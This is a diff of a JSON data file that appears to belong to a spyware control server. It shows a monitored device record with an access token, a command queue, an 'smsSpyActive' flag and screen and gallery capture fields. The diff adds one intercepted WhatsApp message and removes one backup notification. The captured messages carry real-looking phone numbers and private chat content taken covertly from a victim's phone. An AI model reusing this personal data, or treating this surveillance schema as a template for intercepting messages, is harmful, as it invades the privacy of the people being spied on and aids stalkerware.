@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777381237469,
+    "lastSeen": 1777381261476,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -5420,6 +5420,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-1953-5056",
+        "content": "Kontol ngebet amat anj najis cuih ge cmn bilng kgm doang bukan mau beli gw cmn mau nnya dulu tool najis",
+        "time": "28/04 20:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777381261819
+      },
       {
         "appName": "WhatsApp",
         "sender": "JB 11 ALLGAME FISBU 🤑 [ REKBER WAJIB KE 085775321445 &  085775320523  SELAIN INI CLONE )",
@@ -9411,14 +9419,6 @@
         "time": "28/04 06:33",
         "pkg": "com.whatsapp",
         "receivedAt": 1777332841067
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Mengunggah: 6,2 MB dari 119 MB (5%)",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332840444
       }
     ],
     "galleryPhotos": [],
